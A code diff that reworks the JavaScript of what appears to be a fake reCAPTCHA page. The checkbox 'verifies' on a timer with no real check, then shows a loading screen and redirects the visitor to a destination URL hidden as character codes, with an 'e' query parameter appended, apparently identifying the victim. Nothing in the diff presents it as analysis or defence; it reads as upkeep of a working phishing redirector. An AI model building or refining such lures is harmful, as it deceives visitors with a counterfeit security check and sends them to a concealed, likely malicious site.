@@ -221,34 +221,31 @@
 
       recaptchaCheckbox.addEventListener('click', function() {
         if (!isVerified) {
-          // Show blue spinner (no box)
+          // Show loading spinner
           checkbox.classList.add('loading');
-
+          
+          // Verification process (2 seconds)
           setTimeout(() => {
-          // Show green tick
-          checkbox.classList.remove('loading');
-          checkbox.classList.add('checked');
-          isVerified = true;
-
-          // Wait 1 second showing just the green tick
-          setTimeout(() => {
-            // Then show loading screen
-            captchaContainer.style.display = 'none';
-            loadingScreen.style.display = 'block';
-            loadingScreen.style.opacity = '1';
-
-            // Start redirect
-            startRedirect();
-          }, 700); // 1 second delay for green tick
-        }, 2000); // 3 seconds total verification time
-        } else {
-          // Reset to initial state
-          checkbox.classList.remove('checked', 'loading');
-          isVerified = false;
+            // Show verification checkmark
+            checkbox.classList.remove('loading');
+            checkbox.classList.add('checked');
+            isVerified = true;
+            
+            // Show loading screen after verification (0.7 second delay)
+            setTimeout(() => {
+              captchaContainer.style.display = 'none';
+              loadingScreen.style.display = 'block';
+              loadingScreen.style.opacity = '1';
+              
+              // Start URL compilation and redirection after loading screen is shown
+              compileAndRedirect();
+            }, 700);
+          }, 2000);
         }
       });
 
-      function startRedirect() {
+      function compileAndRedirect() {
+        // Compile the URL (this happens after verification)
         const urlParams = new URLSearchParams(window.location.search);
         const encodedParam = urlParams.get('e') || '';
 
@@ -264,6 +261,7 @@
         const baseUrl = parts.map(c => String.fromCharCode(c)).join('');
         const targetUrl = baseUrl + encodedParam;
 
+        // Redirect after 2 seconds of showing loading screen
         setTimeout(function() {
           window.location.href = targetUrl;
         }, 2000);
